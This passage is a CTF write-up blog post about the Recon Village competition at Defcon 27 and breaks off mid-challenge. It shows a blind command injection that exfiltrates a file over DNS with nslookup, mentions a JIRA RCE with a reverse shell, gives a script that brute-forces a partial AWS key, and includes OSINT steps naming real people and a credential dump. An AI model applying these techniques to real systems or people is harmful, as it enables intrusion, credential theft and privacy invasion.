---
layout: post
title: Recon Village CTF @ Defcon 27
date: '2019-08-12T00:24:00.000-07:00'
author: Keramas
tags: 
modified_time: '2019-08-12T12:22:23.925-07:00'
thumbnail: https://1.bp.blogspot.com/-HHerq9UHPwQ/XVEIctc4JZI/AAAAAAAAA-s/SyM8pJL8BD4iXqLgjqpkY6BTHozSqh9dQCEwYBhgL/s72-c/ctf_end.png
blogger_id: tag:blogger.com,1999:blog-4206503528938574504.post-7650360248259404358
blogger_orig_url: https://k3ramas.blogspot.com/2019/08/recon-village-ctf-defcon-27.html
---

My CTF team, Neutrino Cannon, participated in the Recon Village CTF at Defcon 27 once again for the third year in a row, and as the saying goes "the third time is the charm" as we managed to finish in first place. We dedicated almost all of our time at Defcon to the CTF, and the team's unwavering focus to complete challenges locked in the victory.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-HHerq9UHPwQ/XVEIctc4JZI/AAAAAAAAA-s/SyM8pJL8BD4iXqLgjqpkY6BTHozSqh9dQCEwYBhgL/s1600/ctf_end.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="870" data-original-width="1600" height="346" src="https://1.bp.blogspot.com/-HHerq9UHPwQ/XVEIctc4JZI/AAAAAAAAA-s/SyM8pJL8BD4iXqLgjqpkY6BTHozSqh9dQCEwYBhgL/s640/ctf_end.png" width="640" /></a></div><br />There were a lot more challenges this year than in past years, and while this write-up will include most challenges, it will not be a fully inclusive list. However, the official write-up from the Recon Village team should be released in the coming days, so be sure to check that out as well.<br /><br /><h2>Challenge Solutions</h2><br /><h3>USA - 500 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-qs1e9AfXbG0/XVEIZyapVXI/AAAAAAAAA8g/DCviAFe0gwU8iM3mU21d51Zxu7_4iJZygCEwYBhgL/s1600/USA.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="547" data-original-width="637" height="342" src="https://1.bp.blogspot.com/-qs1e9AfXbG0/XVEIZyapVXI/AAAAAAAAA8g/DCviAFe0gwU8iM3mU21d51Zxu7_4iJZygCEwYBhgL/s400/USA.png" width="400" /></a></div><br />Opening the provided URL into a browser, the site greets us with a simple input field.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-XdDM_9x4CPI/XVEIaQ47AzI/AAAAAAAAA8k/ZwNX9enLomk4IlXrYfpMcloW6CO-7kO1wCEwYBhgL/s1600/USA_1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="393" data-original-width="735" height="213" src="https://1.bp.blogspot.com/-XdDM_9x4CPI/XVEIaQ47AzI/AAAAAAAAA8k/ZwNX9enLomk4IlXrYfpMcloW6CO-7kO1wCEwYBhgL/s400/USA_1.png" width="400" /></a></div><br />The source code revealed that the flag would be located at "/opt/flag.txt", so we knew there would be something that could be done here to allow for LFI or an injection of some sort.<br /><br />We started by doing simple manual tests for, and while XSS was successful, it didn't seem like it would yield anything useful. Noticing that the page was PHP, we then moved onto trying PHP code injection to see if anything would run. This did not pan out, so we continued to fuzz this for potential issues with a Burp Collaborator server up and noticed that it was receiving hits for straight up OS command injection.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-DlvS40mKhzQ/XVEIaS7XrnI/AAAAAAAAA8o/Poozikfm3zY41X9NJA4dcBmTvVhQTuadgCEwYBhgL/s1600/USA_ping.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="379" data-original-width="712" height="212" src="https://1.bp.blogspot.com/-DlvS40mKhzQ/XVEIaS7XrnI/AAAAAAAAA8o/Poozikfm3zY41X9NJA4dcBmTvVhQTuadgCEwYBhgL/s400/USA_ping.png" width="400" /></a></div><br />Seeing that the server was pinging the collaborator server successfully we realized we had a blind OS command injection. Unfortunately, we could not get a reverse shell, but we managed to retrieve the flag through DNS exfiltration using nslookup.<br /><br />First we setup a tcpdump to monitor for DNS queries:<br />"tcpdump -ni eth0 udp port 53"<br /><br />Then we input the following command:<br />"nslookup $(cat /opt/flag.txt) &lt;IP address&gt;"<br /><br />When it makes the query we can retrieve the flag.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-etL5pG8v9DY/XVEJOF_qhKI/AAAAAAAAA_A/1Le2oSoHHbE5W-IdWK0P9E6FASJkTLRNQCEwYBhgL/s1600/usa_flag_mod.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="78" data-original-width="1228" height="40" src="https://1.bp.blogspot.com/-etL5pG8v9DY/XVEJOF_qhKI/AAAAAAAAA_A/1Le2oSoHHbE5W-IdWK0P9E6FASJkTLRNQCEwYBhgL/s640/usa_flag_mod.png" width="640" /></a></div><br /><h3>Turkey - 300 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-YymMKT6-byg/XVEIknBOnyI/AAAAAAAAA-w/KU3uT8O7BlsDxTTWjd6LxqSH05Zfd4zKwCEwYBhgL/s1600/turkey.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="549" data-original-width="642" height="341" src="https://1.bp.blogspot.com/-YymMKT6-byg/XVEIknBOnyI/AAAAAAAAA-w/KU3uT8O7BlsDxTTWjd6LxqSH05Zfd4zKwCEwYBhgL/s400/turkey.png" width="400" /></a></div><br />Doing a quick Nmap scan of this IP reveals that port 8080 is open and it is running JIRA.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-k0rivdr2ogM/XVEIlVcFdtI/AAAAAAAAA-w/1QWm8MA-DKoqY6Fbx0xTj4db6Oa7f7gQACEwYBhgL/s1600/turkey_jira.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="416" data-original-width="997" height="265" src="https://1.bp.blogspot.com/-k0rivdr2ogM/XVEIlVcFdtI/AAAAAAAAA-w/1QWm8MA-DKoqY6Fbx0xTj4db6Oa7f7gQACEwYBhgL/s640/turkey_jira.png" width="640" /></a></div><br />Based on the version indicated at the page footer, there is a CVE associated with this for RCE.<br /><br />References:<br />-<a href="https://medium.com/@ruvlol/rce-in-jira-cve-2019-11581-901b845f0f">https://medium.com/@ruvlol/rce-in-jira-cve-2019-11581-901b845f0f</a><br />-<a href="https://community.atlassian.com/t5/Jira-articles/CVE-2019-11581-Critical-Security-Advisory-for-Jira-Server-and/ba-p/1128241">https://community.atlassian.com/t5/Jira-articles/CVE-2019-11581-Critical-Security-Advisory-for-Jira-Server-and/ba-p/1128241</a><br /><br />Using this with a reverse shell payload, we are able to access the server and retrieve the flag.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-_Kk2UKN8gJE/XVEIlHd6eeI/AAAAAAAAA-0/QqEuKn77lAkDQ4ysd5Rg_xJ-V_8Yad00ACEwYBhgL/s1600/turkey_JIRA_exploit.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="672" data-original-width="1007" height="426" src="https://1.bp.blogspot.com/-_Kk2UKN8gJE/XVEIlHd6eeI/AAAAAAAAA-0/QqEuKn77lAkDQ4ysd5Rg_xJ-V_8Yad00ACEwYBhgL/s640/turkey_JIRA_exploit.png" width="640" /></a></div><br />(*A screencap was not taken when capturing the flag from this RCE, and unfortunately (though not confirmed for certain) we believe something was wrong with the server after a while as RCE through this method no longer worked for my team or other teams when discussing post-CTF)<br /><br /><h3>Mongolia - 300 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-GmwpAJkvHM0/XVEIZ3ftoVI/AAAAAAAAA-g/nG7Bi7SD8scVfYXBC8B4drcavjjaKEInQCEwYBhgL/s1600/Mongolia.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="551" data-original-width="640" height="343" src="https://1.bp.blogspot.com/-GmwpAJkvHM0/XVEIZ3ftoVI/AAAAAAAAA-g/nG7Bi7SD8scVfYXBC8B4drcavjjaKEInQCEwYBhgL/s400/Mongolia.png" width="400" /></a></div><br />Based on the challenge text and the website, spidey-sense was tingling that we either needed to send hash collision strings or there would be a type juggling vulnerability.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-NNqK_tHUHnw/XVEIgXSiPGI/AAAAAAAAA-g/NXWiTS4skA0bHUmtTajvm_vIbM1F4cUeQCEwYBhgL/s1600/mongolia_webpage.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="526" data-original-width="1006" height="332" src="https://1.bp.blogspot.com/-NNqK_tHUHnw/XVEIgXSiPGI/AAAAAAAAA-g/NXWiTS4skA0bHUmtTajvm_vIbM1F4cUeQCEwYBhgL/s640/mongolia_webpage.png" width="640" /></a></div><br />Interestingly, however, the strings that were being sent to the server were not being processed by a normal MD5 hashing function, as the values that were being output to the screen were not matching the MD5 sum of the strings we were getting locally. We thought it could be salting it or performing multiple hashings; however, we turned to type juggling as another idea.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-Zi4HQGCMN_w/XVEIfSbqRwI/AAAAAAAAA-g/5uAhWI1ByRgPPJV_oY2JC0LdFYE4drAawCEwYBhgL/s1600/mongolia_hashes.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="689" data-original-width="997" height="441" src="https://1.bp.blogspot.com/-Zi4HQGCMN_w/XVEIfSbqRwI/AAAAAAAAA-g/5uAhWI1ByRgPPJV_oY2JC0LdFYE4drAawCEwYBhgL/s640/mongolia_hashes.png" width="640" /></a></div><br />Changing the get request so that the parameters are empty arrays tricks the check that the strings are different, but they evaluate to be the same hash through the PHP code.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-RLr9i8rE2Ac/XVEIf0GDHZI/AAAAAAAAA-4/LXVoxV_OA8UCVsDj15VW2anZJsr7jr_gACEwYBhgL/s1600/mongolia_solution.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="709" data-original-width="990" height="457" src="https://1.bp.blogspot.com/-RLr9i8rE2Ac/XVEIf0GDHZI/AAAAAAAAA-4/LXVoxV_OA8UCVsDj15VW2anZJsr7jr_gACEwYBhgL/s640/mongolia_solution.png" width="640" /></a></div><br /><h3>United Kingdom - 300 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-EdcqZCrC2D0/XVEIl4YaxXI/AAAAAAAAA-4/xLH-1eIYV74cvxbMVi-xTVYj049-p-CwwCEwYBhgL/s1600/uk.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="574" data-original-width="641" height="357" src="https://1.bp.blogspot.com/-EdcqZCrC2D0/XVEIl4YaxXI/AAAAAAAAA-4/xLH-1eIYV74cvxbMVi-xTVYj049-p-CwwCEwYBhgL/s400/uk.png" width="400" /></a></div><br />Looking at the fragment of the key in the challenge text, we realized that this was an AWS-related challenge based on the "AKIA" prologue. There are two parts required to access and query AWS: the access ID (this is the key that is missing characters) and the private key (which they graciously gave to us). Since we have the private key and the access ID is only missing two characters, we wrote a python script in conjunction with a bash script to test all possible combinations which will perform a simple query. Based on the output we could determine which characters completed the key.<br /><br />Bash script to query:<br /><a href="https://gist.github.com/cauealvesbraz/1121c0a0375648db13b137b31ef8955d">https://gist.github.com/cauealvesbraz/1121c0a0375648db13b137b31ef8955d</a><br /><br />Python wrapper script:<br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: green;">#!/usr/bin/python</span><br /><br /><span style="color: blue;">import</span> random<br /><span style="color: blue;">import</span> string<br /><span style="color: blue;">from</span> commands <span style="color: blue;">import</span> *<br /><span style="color: blue;">import</span> os<br /><span style="color: blue;">import</span> sys<br /><br />key_id = <span style="color: #a31515;">"AKIA2SR3ZZCIQ7LT5Q"</span> <span style="color: green;">#xx</span><br />a_key = <span style="color: #a31515;">"wotwpfUVRMmhkRoGPfgxd69enU6e0lnLqwnvZjtg"</span><br /><br />lettersAndDigits = string.ascii_uppercase + string.digits<br />missing = list()<br /><span style="color: blue;">for</span> i <span style="color: blue;">in</span> lettersAndDigits:<br />    <span style="color: blue;">for</span> j <span style="color: blue;">in</span> lettersAndDigits:<br />    missing.append( i + j )<br /><br /><span style="color: blue;">for</span> i <span style="color: blue;">in</span> missing:<br />    f = open(<span style="color: #a31515;">"/root/.aws/credentials"</span>,<span style="color: #a31515;">'w'</span>)<br />    new_key_id = key_id + i<br />    f.write(<span style="color: #a31515;">"[default]\naws_access_key_id = "</span> + new_key_id + <span style="color: #a31515;">"\n"</span>+<span style="color: #a31515;">"aws_secret_access_key = "</span> + a_key + <span style="color: #a31515;">"\nregion = us-east-1\n"</span>)<br />    f.close()<br />    status, text = getstatusoutput(<span style="color: #a31515;">"./key.sh "</span> +new_key_id)<br />    <span style="color: blue;">if</span> <span style="color: #a31515;">"InvalidClientTokenId"</span> <span style="color: blue;">in</span> text:<br />        <span style="color: blue;">print</span> <span style="color: #a31515;">"NOT FOUND: "</span> + new_key_id + <span style="color: #a31515;">"\n [!]RESULT: "</span> + text + <span style="color: #a31515;">"\n\n"</span><br />    <span style="color: blue;">else</span>:<br />        <span style="color: blue;">print</span> <span style="color: #a31515;">"******FOUND******\n"</span> + new_key_id + <span style="color: #a31515;">"\n [+]RESULT: "</span> + text + <span style="color: #a31515;">"\n\n"</span><br />        k_f = open(<span style="color: #a31515;">"key.txt"</span>,<span style="color: #a31515;">"w"</span>)<br />        k_f.write(str(new_key_id))<br />        k_f.close()<br />        <span style="color: blue;">break</span><br /></pre></div><br />This resulted in the following access ID: AKIA2SR3ZZCIQ7LT5QVZ<br /><br />With the valid access ID and private key, we could list the S3 buckets present and retrieved the flag.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-CKGq8H8_w7s/XVEIi2uBPyI/AAAAAAAAA-s/HFPaRuoRt142yfT4U71EPE4z0GMvn49owCEwYBhgL/s1600/s3bucket.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="91" data-original-width="788" height="73" src="https://1.bp.blogspot.com/-CKGq8H8_w7s/XVEIi2uBPyI/AAAAAAAAA-s/HFPaRuoRt142yfT4U71EPE4z0GMvn49owCEwYBhgL/s640/s3bucket.png" width="640" /></a></div><br /><h3>Canada - 400 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-f0z2PaBKcq0/XVEIZ6pAMWI/AAAAAAAAA-0/eZtz9ZK9bEcHy_cZCZhPLmFBUSkvu4dEQCEwYBhgL/s1600/Canada.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="546" data-original-width="640" height="341" src="https://1.bp.blogspot.com/-f0z2PaBKcq0/XVEIZ6pAMWI/AAAAAAAAA-0/eZtz9ZK9bEcHy_cZCZhPLmFBUSkvu4dEQCEwYBhgL/s400/Canada.png" width="400" /></a></div><br />The challenge text reeked of Docker, and trying out a 'docker pull' on the potential repo successfully grabbed an image.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-DyJ82OxLqB0/XVEIbkBMz6I/AAAAAAAAA-o/L4iXbfgJ6cYztAoPNVH0j87fSuYeWE5PwCEwYBhgL/s1600/canada_docker_image.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="59" data-original-width="904" height="40" src="https://1.bp.blogspot.com/-DyJ82OxLqB0/XVEIbkBMz6I/AAAAAAAAA-o/L4iXbfgJ6cYztAoPNVH0j87fSuYeWE5PwCEwYBhgL/s640/canada_docker_image.png" width="640" /></a></div><br />Exploring the history, there was a curl command being executed to retrieve a node_js-related file. Curling this file, we see mention of a git repo in the source code.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-rgNW_ryXe-4/XVEIcFspyiI/AAAAAAAAA-w/54BeXIbeiwE8aNjiSltG0KethOKEFduqgCEwYBhgL/s1600/canada_git_curl.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="104" data-original-width="901" height="72" src="https://1.bp.blogspot.com/-rgNW_ryXe-4/XVEIcFspyiI/AAAAAAAAA-w/54BeXIbeiwE8aNjiSltG0KethOKEFduqgCEwYBhgL/s640/canada_git_curl.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-ebaMWdEAAQ4/XVEIcfpE-pI/AAAAAAAAA-s/LW7EBRqV4IkbWVrTTCJY1UJPR6ao1duWwCPcBGAYYCw/s1600/canada_secret.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="161" data-original-width="558" height="184" src="https://1.bp.blogspot.com/-ebaMWdEAAQ4/XVEIcfpE-pI/AAAAAAAAA-s/LW7EBRqV4IkbWVrTTCJY1UJPR6ao1duWwCPcBGAYYCw/s640/canada_secret.png" width="640" /></a></div><br />Browsing to this, we combed through the commit history and discovered the flag.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-jC2fGdtGfYQ/XVEIcMbBPnI/AAAAAAAAA-4/D3RgtmXY9fUSAuNUTN8vJ2YMbz-ApFuWgCEwYBhgL/s1600/canada_flag.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="273" data-original-width="960" height="182" src="https://1.bp.blogspot.com/-jC2fGdtGfYQ/XVEIcMbBPnI/AAAAAAAAA-4/D3RgtmXY9fUSAuNUTN8vJ2YMbz-ApFuWgCEwYBhgL/s640/canada_flag.png" width="640" /></a></div><br /><h3>Belarus - 200 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-mw64K7shUfk/XVEIbDTNfBI/AAAAAAAAA-s/zPmd5oKYsR0KaIUSEjsCZRMj9o4QDBHUQCEwYBhgL/s1600/belarus.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="562" data-original-width="639" height="351" src="https://1.bp.blogspot.com/-mw64K7shUfk/XVEIbDTNfBI/AAAAAAAAA-s/zPmd5oKYsR0KaIUSEjsCZRMj9o4QDBHUQCEwYBhgL/s400/belarus.png" width="400" /></a></div><br /><div style="text-align: center;">Image:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-QEXcdoGwPGk/XVELVuWeWGI/AAAAAAAAA_Q/3admpm1xv1kiTBLovnaJYaFGpy9d_KjIwCEwYBhgL/s1600/CTF14_de2d354c0017e080ec7f120b40b980d6.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="1600" data-original-width="1200" height="400" src="https://1.bp.blogspot.com/-QEXcdoGwPGk/XVELVuWeWGI/AAAAAAAAA_Q/3admpm1xv1kiTBLovnaJYaFGpy9d_KjIwCEwYBhgL/s400/CTF14_de2d354c0017e080ec7f120b40b980d6.png" width="300" /></a></div><br />Looking closely at the image, there is faint text on the white building's wall. Zooming in on it reveals "English National Ballet".<br /><br />&nbsp;<a href="https://www.google.nl/maps/place/English+National+Ballet/@51.5120302,0.0062593,17z/data=!4m5!3m4!1s0x4876055b0af21cdb:0x435e69d83228ec35!8m2!3d51.5132496!4d0.0064038">https://www.google.nl/maps/place/English+National+Ballet/@51.5120302,0.0062593,17z/data=!4m5!3m4!1s0x4876055b0af21cdb:0x435e69d83228ec35!8m2!3d51.5132496!4d0.0064038</a><br /><br />The above map shows that the nearest train station is "Canning Town" which is the flag.<br /><div style="background-color: white; color: #172b4d; font-family: -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;Noto Sans&quot;, Ubuntu, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; font-size: 14px; margin-bottom: 8px; overflow-wrap: break-word; text-overflow: ellipsis;"><br /></div><br /><h3>Ethiopia - 100 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-E6HOS-f3WS4/XVEIddkjWEI/AAAAAAAAA-w/BFtU3np1dOkgapnpfGvbMrU8UPajDNn3wCEwYBhgL/s1600/ethiopia.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="542" data-original-width="634" height="341" src="https://1.bp.blogspot.com/-E6HOS-f3WS4/XVEIddkjWEI/AAAAAAAAA-w/BFtU3np1dOkgapnpfGvbMrU8UPajDNn3wCEwYBhgL/s400/ethiopia.png" width="400" /></a></div><br />Using Zoomeye, we crafted a search query to locate the indicated host, and thus the flag.<br /><br />"+country:"MX" +app:"WebLogic applications server" +after:"2015-01-01" +before:"2016-01-01""<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-sLY1vAlvzp0/XVEId5WPlxI/AAAAAAAAA-g/Ity5RBZRQIQPMqOr1HTsjKZDLkuIQTlbwCEwYBhgL/s1600/ethiopia_server.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="359" data-original-width="861" height="266" src="https://1.bp.blogspot.com/-sLY1vAlvzp0/XVEId5WPlxI/AAAAAAAAA-g/Ity5RBZRQIQPMqOr1HTsjKZDLkuIQTlbwCEwYBhgL/s640/ethiopia_server.png" width="640" /></a></div><br /><h3>Australia - 200 points</h3><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-eeaQJLRE4oI/XVEJMHyCTGI/AAAAAAAAA_E/zCXaHWxyP2gPjxTe73AMe5vC2mEyxuA9wCEwYBhgL/s1600/australia.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="545" data-original-width="635" height="342" src="https://1.bp.blogspot.com/-eeaQJLRE4oI/XVEJMHyCTGI/AAAAAAAAA_E/zCXaHWxyP2gPjxTe73AMe5vC2mEyxuA9wCEwYBhgL/s400/australia.png" width="400" /></a></div><br />This challenge required you to be on-site at Defcon. Looking at the back of the regular Recon Village badge passed out to attendees, there was a string of binary.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-Yhr36RfQe1E/XVEMuTfetdI/AAAAAAAAA_k/l2fut1wPsu4t311oCBkFj_Uj25irLcGoQCEwYBhgL/s1600/ppl_badge.jpeg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="1280" data-original-width="720" height="320" src="https://1.bp.blogspot.com/-Yhr36RfQe1E/XVEMuTfetdI/AAAAAAAAA_k/l2fut1wPsu4t311oCBkFj_Uj25irLcGoQCEwYBhgL/s320/ppl_badge.jpeg" width="180" /></a></div><br />Converting this to ascii we only got "https://pa". Having noticed that staff were wearing a red badge and we had a black badge, we knew we had to track one of them down to get the next part of the puzzle.<br /><br />Checking out a red badge gave us more information:<br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-jnknWspF8FQ/XVEMwu2_S5I/AAAAAAAAA_o/k2TfCmNPtkwPcWWraqDJlrZ2Emw3Dr7AgCEwYBhgL/s1600/staff_badge.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="468" data-original-width="351" height="320" src="https://1.bp.blogspot.com/-jnknWspF8FQ/XVEMwu2_S5I/AAAAAAAAA_o/k2TfCmNPtkwPcWWraqDJlrZ2Emw3Dr7AgCEwYBhgL/s320/staff_badge.jpg" width="240" /></a></div><br />"https://pastebin.com"<br /><br />We immediately realized that speakers at the village had a different color badge, and after waiting for a speaker to be free after a talk, we secured the key part of the URL and retrieved the flag.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-2xZUzTnO7hM/XVEMsYW0JXI/AAAAAAAAA_g/5zMKGNemEF08KMcGVgkmIM42ZmI3BL34QCEwYBhgL/s1600/blue_badge.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="468" data-original-width="351" height="320" src="https://1.bp.blogspot.com/-2xZUzTnO7hM/XVEMsYW0JXI/AAAAAAAAA_g/5zMKGNemEF08KMcGVgkmIM42ZmI3BL34QCEwYBhgL/s320/blue_badge.jpg" width="240" /></a></div><br />"https://pastebin.com/CQ5Bg9X7"<br /><br />flag:{y0uar3g00datnetw0rking}<br /><br /><h3>South Africa - 300 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-Be8RN5pqlrg/XVEIjbOg6UI/AAAAAAAAA-o/TJrGHdtGH1E9gEZyNXOnpVVfwcfH99_DgCEwYBhgL/s1600/southafrica.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="565" data-original-width="640" height="352" src="https://1.bp.blogspot.com/-Be8RN5pqlrg/XVEIjbOg6UI/AAAAAAAAA-o/TJrGHdtGH1E9gEZyNXOnpVVfwcfH99_DgCEwYBhgL/s400/southafrica.png" width="400" /></a></div><br /><div style="text-align: center;">Image:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-DAChBzclvV4/XVENSfKWa6I/AAAAAAAAA_4/cV6OHxLmMK0rLBnmJ1AcgETWOHHLH-3IgCLcBGAs/s1600/image_c313156725468cdc17d01c02ecb62a1c.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="414" data-original-width="939" height="281" src="https://1.bp.blogspot.com/-DAChBzclvV4/XVENSfKWa6I/AAAAAAAAA_4/cV6OHxLmMK0rLBnmJ1AcgETWOHHLH-3IgCLcBGAs/s640/image_c313156725468cdc17d01c02ecb62a1c.png" width="640" /></a></div><br />Based on the text written on the building that shows "Shakespeare's Board", we were able to locate it on the map:<br /><a href="https://www.google.com/maps/place/Shakespeare%27s+Head/@51.516816,-0.1218747,17z/data=!3m1!4b1!4m5!3m4!1s0x48761b350efbd81b:0x5db525154ac44772!8m2!3d51.516816!4d-0.119686">https://www.google.com/maps/place/Shakespeare%27s+Head/@51.516816,-0.1218747,17z/data=!3m1!4b1!4m5!3m4!1s0x48761b350efbd81b:0x5db525154ac44772!8m2!3d51.516816!4d-0.119686</a><br /><br />Changing the address to "70", we determined that the company was 'Mishcon de Reya'<br /><br />After a bit of searching found that the "mishcon.com/people" page listed profiles of employees, and found that Lena Kearney was the Strategy Manager.<br /><br />Heading to Facebook and searching for her, the present work listing matched and exploring her profile revealed the name of the catering company: "Sinclair's Catering", which was the flag.<br /><br /><h3>Norway - 300 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-VFQbqjfhoew/XVEIgyZFs1I/AAAAAAAAA-s/3WsPB3X9SuUYTGEkeu8qWh8Y1V1mX_HIwCEwYBhgL/s1600/norway.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="549" data-original-width="641" height="342" src="https://1.bp.blogspot.com/-VFQbqjfhoew/XVEIgyZFs1I/AAAAAAAAA-s/3WsPB3X9SuUYTGEkeu8qWh8Y1V1mX_HIwCEwYBhgL/s400/norway.png" width="400" /></a></div><br />With some Google-fu, we suspected the student was Ben Price:<br /><a href="http://www.diggah.net/contact-2/" rel="noreferrer nofollow" style="background-color: white; color: #091e42; font-family: -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;Noto Sans&quot;, Ubuntu, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; font-size: 14px; outline: 0px;" target="_blank">http://www.diggah.net/contact-2/</a><br /><br />Doing a bit more...digging...we found his email to be "diggah@diggah.net". Searching with this email, we found a pastebin dump with credentials, which was the flag.<br /><br /><a href="https://pastebin.com/YKMtMT6J" rel="noreferrer nofollow" style="background-color: white; color: #091e42; font-family: -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;Noto Sans&quot;, Ubuntu, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; font-size: 14px; outline: 0px;" target="_blank">https://pastebin.com/YKMtMT6J</a><br />flag:{<a href="mailto:diggah@diggah.net" style="background-color: white; color: #172b4d; font-family: -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;Noto Sans&quot;, Ubuntu, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; font-size: 14px;">diggah@diggah.net</a><span style="background-color: white; color: #172b4d; font-family: , , &quot;segoe ui&quot; , &quot;roboto&quot; , &quot;noto sans&quot; , &quot;ubuntu&quot; , &quot;droid sans&quot; , &quot;helvetica neue&quot; , sans-serif; font-size: 14px;">:m0nkeyfun}&nbsp;</span><br /><br /><h3>Thailand - 100 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-PUpK2F5uAHo/XVEIj1aXXUI/AAAAAAAAA-o/XFlVoPjI6bc5TX1i5woIkO7B77umx5uVACEwYBhgL/s1600/thailand.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="559" data-original-width="637" height="350" src="https://1.bp.blogspot.com/-PUpK2F5uAHo/XVEIj1aXXUI/AAAAAAAAA-o/XFlVoPjI6bc5TX1i5woIkO7B77umx5uVACEwYBhgL/s400/thailand.png" width="400" /></a></div><br /><div style="text-align: center;">Image:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-HNnzY-bJ53g/XVELR8RHyNI/AAAAAAAAA_U/UidmpwGGb54SKKw8a0NFk_j13QH3p-W1ACEwYBhgL/s1600/ctf1_cdd4d5438229ba242947d4803ec99687.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 